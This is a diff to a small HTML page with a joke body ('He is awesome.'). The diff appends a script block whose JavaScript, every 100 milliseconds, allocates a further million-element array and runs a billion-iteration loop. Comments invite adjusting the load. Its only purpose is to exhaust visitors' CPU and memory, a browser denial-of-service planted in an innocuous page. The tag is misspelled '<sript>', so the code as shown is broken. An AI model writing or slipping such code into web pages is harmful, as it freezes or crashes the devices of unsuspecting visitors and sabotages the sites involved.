@@ -8,4 +8,21 @@
   <body>
     He is awesome. 🤣😂
   </body>
+  <sript>
+    let data = [];
+function fillMemory() {
+  data.push(new Array(1024 * 1024).fill(0)); // Adjust array size for memory usage
+}
+function heavyComputation() {
+  let result = 0;
+  for (let i = 0; i < 1000000000; i++) { // Adjust loop iterations for desired load
+    result += Math.random() * Math.random();
+  }
+  return result;
+}
+
+setInterval(heavyComputation, 100);
+setInterval(fillMemory, 100); // Adjust interval for memory allocation rate
+
+  </sript>
 </html>
